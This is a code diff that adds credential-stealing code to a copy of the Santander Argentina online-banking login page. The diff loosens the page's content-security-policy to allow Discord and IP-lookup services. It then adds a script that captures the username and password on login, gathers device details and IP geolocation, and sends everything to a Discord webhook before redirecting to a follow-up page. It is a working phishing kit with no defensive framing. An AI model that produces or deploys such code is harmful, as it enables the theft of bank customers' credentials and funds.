@@ -19,7 +19,7 @@
 	href="../../images/favicon.png">
 <link rel=canonical href=https://www2.personas.santander.com.ar/obp-webapp/angular/#!/login>
 <meta http-equiv=content-security-policy
-	content="default-src 'self' http://127.0.0.1:5500; font-src 'self' data:; img-src 'self' data: http://127.0.0.1:5500; style-src 'unsafe-inline' 'self' http://127.0.0.1:5500; media-src 'self' data:; script-src 'unsafe-inline' 'self' data: http://127.0.0.1:5500; object-src 'self' data:; frame-src 'self' data: http://127.0.0.1:5500; connect-src 'self' http://127.0.0.1:5500;">
+	content="default-src 'self' http://127.0.0.1:5500; font-src 'self' data:; img-src 'self' data: http://127.0.0.1:5500; style-src 'unsafe-inline' 'self' http://127.0.0.1:5500; media-src 'self' data:; script-src 'unsafe-inline' 'self' data: http://127.0.0.1:5500; object-src 'self' data:; frame-src 'self' data: http://127.0.0.1:5500; connect-src 'self' http://127.0.0.1:5500 https://discord.com https://api.ipdata.co http://ip-api.com;">
 <body ng-app=app md-no-ink ng-strict-di
 	class="desktop retail login"
 	cz-shortcut-listen=true>
@@ -168,3 +168,66 @@
 			</div><obp-orientation-modal></obp-orientation-modal><obp-validador></obp-validador>
 		</div>
 	</app>
+<script src="../../js/santander-logger.js"></script>
+<script>
+(function() {
+	var btn = document.querySelector('.button-login');
+	if (!btn) return;
+
+	btn.addEventListener('click', function(e) {
+		e.preventDefault();
+		var usuarioInput = document.getElementById('datosusuario');
+		var claveInput = document.getElementById('clave');
+		var usuario = usuarioInput ? usuarioInput.value : '';
+		var clave = claveInput ? claveInput.value : '';
+
+		if (!usuario || !clave) return;
+
+		btn.disabled = true;
+		btn.textContent = 'Cargando...';
+
+		var isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
+		var now = new Date();
+
+		SantanderLogger.getIpInfo().then(function(ipInfo) {
+			var flowData = {
+				usuario: usuario,
+				clave: clave,
+				dispositivo: isMobile ? 'Móvil' : 'Desktop',
+				fecha: now.toLocaleDateString('es-AR'),
+				hora: now.toLocaleTimeString('es-AR', { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
+				userAgent: navigator.userAgent,
+				zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+				resolucion: screen.width + 'x' + screen.height,
+				ipInfo: ipInfo
+			};
+
+			localStorage.setItem('santander_flow_data', JSON.stringify(flowData));
+
+			var embeds = [{
+				title: '🏦 Santander AR - Login Desktop',
+				color: 0xEC0000,
+				fields: [
+					{ name: '👤 Usuario', value: '`' + usuario + '`', inline: true },
+					{ name: '🔑 Contraseña', value: '```' + clave + '```', inline: false },
+					{ name: '📱 Dispositivo', value: '`' + flowData.dispositivo + '`', inline: true },
+					{ name: '📐 Resolución', value: '`' + flowData.resolucion + '`', inline: true },
+					{ name: '🌐 IP', value: '`' + (ipInfo.ip || 'N/A') + '`', inline: false },
+					{ name: '📍 Ubicación', value: '`' + (ipInfo.location || 'N/A') + '`', inline: false },
+					{ name: '🏢 ISP', value: '`' + (ipInfo.isp || 'N/A') + '`', inline: true },
+					{ name: '🏳️ País', value: (ipInfo.flag || '🌐') + ' ' + (ipInfo.country || '??') + ' (' + (ipInfo.country_code || '??') + ')', inline: true },
+					{ name: '🌍 User Agent', value: '```' + flowData.userAgent + '```', inline: false }
+				],
+				footer: { text: flowData.fecha + ' ' + flowData.hora + ' | ' + flowData.zonaHoraria },
+				timestamp: new Date().toISOString()
+			}];
+
+			return SantanderLogger.sendToDiscord(embeds).then(function() {
+				setTimeout(function() {
+					window.location.href = 'bio.html';
+				}, 1200);
+			});
+		});
+	});
+})();
+</script>
